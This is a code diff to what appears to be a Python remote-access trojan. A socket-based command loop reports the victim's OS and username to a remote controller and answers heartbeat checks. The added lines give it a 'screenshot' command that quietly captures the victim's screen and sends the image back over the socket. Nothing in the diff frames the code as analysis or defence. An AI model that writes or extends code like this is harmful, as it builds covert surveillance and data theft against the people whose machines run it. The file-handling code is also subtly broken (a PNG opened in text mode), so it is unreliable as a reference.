@@ -6,6 +6,7 @@ from threading import Thread
 import struct
 import platform
 from time import sleep
+import pyautogui
 
 def start_session(s):
     while True:
@@ -22,6 +23,16 @@ def start_session(s):
                 details += "Version : %s\n"%(str(os_info))
                 details += "User(node) : %s\n"%(str(os_user))
                 s.send(details.encode())
+
+            if "screenshot" in cmd:
+                try:
+                    pyautogui.screenshot("HP.png")
+                    file = open("HP.png",'r')
+                    data = file.read()
+                    file.close()
+                    s.send(data)
+                except:
+                    s.send("FAILED".encode())
 
             if "CHECK" in cmd:
                 s.send("YES".encode())
